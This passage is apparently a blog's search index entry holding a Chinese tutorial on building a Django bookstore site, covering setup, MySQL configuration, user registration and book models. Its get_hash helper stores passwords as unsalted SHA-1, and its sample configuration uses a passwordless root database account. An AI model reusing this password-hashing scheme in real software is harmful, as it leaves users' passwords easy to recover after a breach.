<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Django项目_图书交易平台</title>
      <link href="/2018/10/26/Django%E9%A1%B9%E7%9B%AE-%E5%9B%BE%E4%B9%A6%E4%BA%A4%E6%98%93%E5%B9%B3%E5%8F%B0/"/>
      <url>/2018/10/26/Django%E9%A1%B9%E7%9B%AE-%E5%9B%BE%E4%B9%A6%E4%BA%A4%E6%98%93%E5%B9%B3%E5%8F%B0/</url>
      <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#1">1，新建项目</a></li><li><a href="#2">2，用户系统开发</a></li><li><a href="#3">3，书籍商品模块</a></li><li><a href="#4">4，用户中心实现</a></li><li><a href="#5">5，购物车功能</a></li><li><a href="#6">6，订单页面的开发</a></li><li><a href="#7">7，使用缓存</a></li><li><a href="#8">8，评论功能</a></li><li><a href="#9">9，发送邮件功能实现</a></li><li><a href="#10">10，登陆验证码功能实现</a></li><li><a href="#11">11，全文检索的实现</a></li><li><a href="#12">12，用户激活功能实现</a></li><li><a href="#13">13，用户中心最近浏览功能</a></li><li><a href="#14">14，过滤器功能实现</a></li><li><a href="#15">15，使用nginx+gunicorn+django进行部署</a></li><li><a href="#16">16，django日志模块的使用</a></li><li><a href="#17">17，中间件的编写</a></li></ul><h1 id="1，新建项目"><a href="#1，新建项目" class="headerlink" title="1，新建项目"></a><a id="1">1，新建项目</a></h1><h2 id="1，新建项目-1"><a href="#1，新建项目-1" class="headerlink" title="1，新建项目"></a>1，新建项目</h2><p>新建项目之前需要先看<code>2.</code>，把包都安装了！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> django-admin startproject bookstore</span></span><br></pre></td></tr></table></figure><h2 id="2，将需要用的包添加进来"><a href="#2，将需要用的包添加进来" class="headerlink" title="2，将需要用的包添加进来"></a>2，将需要用的包添加进来</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> wq保存</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim requirements.txt</span></span><br></pre></td></tr></table></figure><p>安装包文件如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># requirements.txt</span></span><br><span class="line">amqp==<span class="number">2.2</span><span class="number">.2</span></span><br><span class="line">billiard==<span class="number">3.5</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">celery==<span class="number">4.1</span><span class="number">.0</span></span><br><span class="line">Django==<span class="number">1.8</span><span class="number">.2</span></span><br><span class="line">django-haystack==<span class="number">2.6</span><span class="number">.1</span></span><br><span class="line">django-redis==<span class="number">4.8</span><span class="number">.0</span></span><br><span class="line">django-tinymce==<span class="number">2.6</span><span class="number">.0</span></span><br><span class="line">itsdangerous==<span class="number">0.24</span></span><br><span class="line">jieba==<span class="number">0.39</span></span><br><span class="line">kombu==<span class="number">4.1</span><span class="number">.0</span></span><br><span class="line">olefile==<span class="number">0.44</span></span><br><span class="line">Pillow==<span class="number">4.3</span><span class="number">.0</span></span><br><span class="line">pycryptodome==<span class="number">3.4</span><span class="number">.7</span></span><br><span class="line">PyMySQL==<span class="number">0.7</span><span class="number">.11</span></span><br><span class="line">python-alipay-sdk==<span class="number">1.7</span><span class="number">.0</span></span><br><span class="line">pytz==<span class="number">2017.2</span></span><br><span class="line">redis==<span class="number">2.10</span><span class="number">.6</span></span><br><span class="line"><span class="comment">#uWSGI==2.0.15</span></span><br><span class="line">vine==<span class="number">1.1</span><span class="number">.4</span></span><br><span class="line">Whoosh==<span class="number">2.7</span><span class="number">.4</span></span><br><span class="line">gunicorn</span><br></pre></td></tr></table></figure><p>安装环境（在虚拟环境中）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install -r requirements<span class="selector-class">.txt</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple/</span></span><br></pre></td></tr></table></figure><h2 id="3，修改项目配置文件，将默认sqlite改为mysql"><a href="#3，修改项目配置文件，将默认sqlite改为mysql" class="headerlink" title="3，修改项目配置文件，将默认sqlite改为mysql"></a>3，修改项目配置文件，将默认sqlite改为mysql</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bookstore/settings.py</span></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'bookstore'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="number">3306</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了使用mysql的驱动，在主app的<code>__init__.py</code>文件中加入以下两行代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure><h1 id="2，用户系统开发"><a href="#2，用户系统开发" class="headerlink" title="2，用户系统开发"></a><a id="2">2，用户系统开发</a></h1><h2 id="1，用户系统的开发"><a href="#1，用户系统的开发" class="headerlink" title="1，用户系统的开发"></a>1，用户系统的开发</h2><p>新建users这个app，也就是用户app，先从注册页做起。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py startapp users</span></span><br></pre></td></tr></table></figure><p>我们建好users app后，需要将它添加到配置文件中去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bookstore/settings.py</span><br><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'users'</span>, <span class="comment"># 用户模块</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后我们需要设计表结构，我们要思考一下，这个users数据表结构应该包含哪些字段？<br>我们需要先抽象出一个BaseModel，一个基本模型，什么意思呢？因为数据表有共同的字段，我们可以把它抽象出来，比如create_at（创建时间），update_at（更新时间），is_delete（软删除）。注意！这个base_model.py要保存在根目录下面的db文件夹中，别忘了db文件夹中的<strong>init</strong>.py。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bookstore/db/base_model.py</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">'''模型抽象基类'''</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="keyword">False</span>, verbose_name=<span class="string">'删除标记'</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="keyword">True</span>, verbose_name=<span class="string">'创建时间'</span>)</span><br><span class="line">    update_time = models.DateTimeField(auto_now=<span class="keyword">True</span>, verbose_name=<span class="string">'更新时间'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>然后我们针对Users设计一张表出来。以下代码写入<code>users/models.py</code>文件中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> db.base_model <span class="keyword">import</span> BaseModel</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Passport</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">'''用户模型类'''</span></span><br><span class="line">    username = models.CharField(max_length=<span class="number">20</span>, unique=<span class="keyword">True</span>, verbose_name=<span class="string">'用户名称'</span>)</span><br><span class="line">    password = models.CharField(max_length=<span class="number">40</span>, verbose_name=<span class="string">'用户密码'</span>)</span><br><span class="line">    email = models.EmailField(verbose_name=<span class="string">'用户邮箱'</span>)</span><br><span class="line">    is_active = models.BooleanField(default=<span class="keyword">False</span>, verbose_name=<span class="string">'激活状态'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户表的管理器</span></span><br><span class="line">    objects = PassportManager()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'s_user_account'</span></span><br></pre></td></tr></table></figure><p>接下来我们在PassportManager()中实现添加和查找账户信息的功能，这样抽象性更好。下面这个类需要写在<code>Passport</code>的上面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> utils.get_hash <span class="keyword">import</span> get_hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PassportManager</span><span class="params">(models.Manager)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_one_passport</span><span class="params">(self, username, password, email)</span>:</span></span><br><span class="line">        <span class="string">'''添加一个账户信息'''</span></span><br><span class="line">        passport = self.create(username=username, password=get_hash(password), email=email)</span><br><span class="line">        <span class="comment"># 3.返回passport</span></span><br><span class="line">        <span class="keyword">return</span> passport</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_one_passport</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        <span class="string">'''根据用户名密码查找账户的信息'''</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            passport = self.get(username=username, password=get_hash(password))</span><br><span class="line">        <span class="keyword">except</span> self.model.DoesNotExist:</span><br><span class="line">            <span class="comment"># 账户不存在</span></span><br><span class="line">            passport = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">return</span> passport</span><br></pre></td></tr></table></figure><p>我们这里有一个get_hash函数，这个函数用来避免存储明文密码。所以我们来编写这个函数。在根目录新建一个文件夹utils，用来存放功能函数，比如get_hash，别忘了<strong>init</strong>.py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bookstore/utils/get_hash.py</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hash</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="string">'''取一个字符串的hash值'''</span></span><br><span class="line">    sh = sha1()</span><br><span class="line">    sh.update(str.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="keyword">return</span> sh.hexdigest()</span><br></pre></td></tr></table></figure><p>接下来我们将Users的表映射到数据库中去。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database bookstore <span class="attribute">charset</span>=utf8;</span><br><span class="line">$ python manage.py makemigrations users</span><br><span class="line">$ python manage.py migrate</span><br></pre></td></tr></table></figure><h2 id="2，用户系统前端模板编写"><a href="#2，用户系统前端模板编写" class="headerlink" title="2，用户系统前端模板编写"></a>2，用户系统前端模板编写</h2><p>接下来我们要将前端模板写一下，先建一个模板文件夹。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir templates</span></span><br></pre></td></tr></table></figure><p>我们第一个实现的功能是渲染注册页。将register.html拷贝到templates/users。<br>将js，css，images文件夹拷贝到static文件夹下。作为静态文件。<br>接下来我们将程序跑起来。看到了Django的欢迎页面。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py runserver 9000</span></span><br></pre></td></tr></table></figure></p><p>然后呢？我们想把register.html渲染出来。我们先来看views.py这个视图文件。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/views.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''显示用户注册页面'''</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>)</span><br></pre></td></tr></table></figure></p><p>然后我们将url映射做好。主应用的urls.py为<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bookstore/urls.py</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</span><br><span class="line">    url(<span class="string">r'^user/'</span>, include(<span class="string">'users.urls'</span>, namespace=<span class="string">'user'</span>)), <span class="comment"># 用户模块</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>‘^’表示只匹配user为开头的url。<br>然后在users app里面的urls配置url映射。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> users <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^register/$'</span>, views.register, name=<span class="string">'register'</span>), <span class="comment"># 用户注册</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>将templates的路径写入配置文件中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="string">'DIRS'</span>: [os.path.join(BASE_DIR, <span class="string">'templates'</span>)], <span class="comment"># 这里别忘记配置！</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>我们可以看到静态文件没有加载出来，所以我们要改一下html文件中的路径。将静态文件的路径前面加上’/static/‘<br>然后在配置文件中加入调试时使用的静态文件目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, <span class="string">'static'</span>)</span><br><span class="line">] <span class="comment"># 调试时使用的静态文件目录</span></span><br></pre></td></tr></table></figure></p><p>好。我们渲染注册页的任务就完成了。</p><h2 id="3，注册页面表单提交功能"><a href="#3，注册页面表单提交功能" class="headerlink" title="3，注册页面表单提交功能"></a>3，注册页面表单提交功能</h2><p>接下来我们要编写注册页面的提交表单功能。<br>1，接受前端传过来的表单数据。<br>2，校验数据。<br>3，写入数据库。<br>4，返回注册页（因为还没做首页）。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/views.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_handle</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''进行用户注册处理'''</span></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    username = request.POST.get(<span class="string">'user_name'</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">'pwd'</span>)</span><br><span class="line">    email = request.POST.get(<span class="string">'email'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([username, password, email]):</span><br><span class="line">        <span class="comment"># 有数据为空</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>, &#123;<span class="string">'errmsg'</span>: <span class="string">'参数不能为空!'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断邮箱是否合法</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">r'^[a-z0-9][\w\.\-]*@[a-z0-9\-]+(\.[a-z]&#123;2,5&#125;)&#123;1,2&#125;$'</span>, email):</span><br><span class="line">        <span class="comment"># 邮箱不合法</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>, &#123;<span class="string">'errmsg'</span>: <span class="string">'邮箱不合法!'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行业务处理:注册，向账户系统中添加账户</span></span><br><span class="line">    <span class="comment"># Passport.objects.create(username=username, password=password, email=email)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Passport.objects.add_one_passport(username=username, password=password, email=email)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>, &#123;<span class="string">'errmsg'</span>: <span class="string">'用户名已存在！'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注册完，还是返回注册页。</span></span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">'user:register'</span>))</span><br></pre></td></tr></table></figure></p><p>配置urls.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/urls.py</span></span><br><span class="line">url(<span class="string">r'^register_handle/$'</span>, views.register_handle, name=<span class="string">'register_handle'</span>), <span class="comment"># 用户注册处理</span></span><br></pre></td></tr></table></figure></p><p>前端使用Form来发送POST请求。<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form <span class="function"><span class="keyword">method</span>="<span class="title">post</span>" <span class="title">action</span>="/<span class="title">user</span>/<span class="title">register_handle</span>/"&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意 添加csrf_token以及错误信息<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; % csrf_token %&#125;</span><br><span class="line">&#123;&#123;errmsg&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>然后就完成注册功能了。之后需要实现发送激活邮件。</p><h1 id="3，书籍商品模块"><a href="#3，书籍商品模块" class="headerlink" title="3，书籍商品模块"></a><a id="3">3，书籍商品模块</a></h1><h2 id="1，渲染首页功能（书籍表结构设计）"><a href="#1，渲染首页功能（书籍表结构设计）" class="headerlink" title="1，渲染首页功能（书籍表结构设计）"></a>1，渲染首页功能（书籍表结构设计）</h2><p>完成注册功能以后，点击注册按钮应该跳转到首页。所以我们把首页index.html完成。先新建一个books app。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py startapp books</span></span><br></pre></td></tr></table></figure></p><p>在配置文件中添加books app<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># bookstore/settings.py</span><br><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'users'</span>, # 用户模块</span><br><span class="line">    <span class="string">'books'</span>, # 商品模块</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>然后设计models，也就是books模块的表结构。这里我们先介绍一下富文本编辑器，因为编辑商品详情页需要使用富文本编辑器。</p><h3 id="富文本编辑器应用到项目中"><a href="#富文本编辑器应用到项目中" class="headerlink" title="富文本编辑器应用到项目中"></a>富文本编辑器应用到项目中</h3><ul><li><p>在settings.py中为INSTALLED_APPS添加编辑器应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'tinymce'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>在settings.py中添加编辑配置项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TINYMCE_DEFAULT_CONFIG = &#123;</span><br><span class="line">    <span class="string">'theme'</span>: <span class="string">'advanced'</span>,</span><br><span class="line">    <span class="string">'width'</span>: <span class="number">600</span>,</span><br><span class="line">    <span class="string">'height'</span>: <span class="number">400</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在根urls.py中配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    ...</span><br><span class="line">    url(<span class="string">r'^tinymce/'</span>, include(<span class="string">'tinymce.urls'</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><p>下面在我们的应用中添加富文本编辑器。<br>然后我们就可以设计我们的商品表结构了，我们可以通过观察detail.html来设计表结构。<br>我们先把一些常用的常量存储到books/enums.py文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PYTHON = <span class="number">1</span></span><br><span class="line">JAVASCRIPT = <span class="number">2</span></span><br><span class="line">ALGORITHMS = <span class="number">3</span></span><br><span class="line">MACHINELEARNING = <span class="number">4</span></span><br><span class="line">OPERATINGSYSTEM = <span class="number">5</span></span><br><span class="line">DATABASE = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">BOOKS_TYPE = &#123;</span><br><span class="line">    PYTHON: <span class="string">'Python'</span>,</span><br><span class="line">    JAVASCRIPT: <span class="string">'Javascript'</span>,</span><br><span class="line">    ALGORITHMS: <span class="string">'数据结构与算法'</span>,</span><br><span class="line">    MACHINELEARNING: <span class="string">'机器学习'</span>,</span><br><span class="line">    OPERATINGSYSTEM: <span class="string">'操作系统'</span>,</span><br><span class="line">    DATABASE: <span class="string">'数据库'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">OFFLINE = <span class="number">0</span></span><br><span class="line">ONLINE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">STATUS_CHOICE = &#123;</span><br><span class="line">    OFFLINE: <span class="string">'下线'</span>,</span><br><span class="line">    ONLINE: <span class="string">'上线'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再来设计表结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> db.base_model <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> tinymce.models <span class="keyword">import</span> HTMLField</span><br><span class="line"><span class="keyword">from</span> books.enums <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Books</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">'''商品模型类'''</span></span><br><span class="line">    books_type_choices = ((k, v) <span class="keyword">for</span> k,v <span class="keyword">in</span> BOOKS_TYPE.items())</span><br><span class="line">    status_choices = ((k, v) <span class="keyword">for</span> k,v <span class="keyword">in</span> STATUS_CHOICE.items())</span><br><span class="line">    type_id = models.SmallIntegerField(default=PYTHON, choices=books_type_choices, verbose_name=<span class="string">'商品种类'</span>)</span><br><span class="line">    name = models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'商品名称'</span>)</span><br><span class="line">    desc = models.CharField(max_length=<span class="number">128</span>, verbose_name=<span class="string">'商品简介'</span>)</span><br><span class="line">    price = models.DecimalField(max_digits=<span class="number">10</span>, decimal_places=<span class="number">2</span>, verbose_name=<span class="string">'商品价格'</span>)</span><br><span class="line">    unit = models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'商品单位'</span>)</span><br><span class="line">    stock = models.IntegerField(default=<span class="number">1</span>, verbose_name=<span class="string">'商品库存'</span>)</span><br><span class="line">    sales = models.IntegerField(default=<span class="number">0</span>, verbose_name=<span class="string">'商品销量'</span>)</span><br><span class="line">    detail = HTMLField(verbose_name=<span class="string">'商品详情'</span>)</span><br><span class="line">    image = models.ImageField(upload_to=<span class="string">'books'</span>, verbose_name=<span class="string">'商品图片'</span>)</span><br><span class="line">    status = models.SmallIntegerField(default=ONLINE, choices=status_choices, verbose_name=<span class="string">'商品状态'</span>)</span><br><span class="line"></span><br><span class="line">    objects = BooksManager()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># admin显示书籍的名字</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span 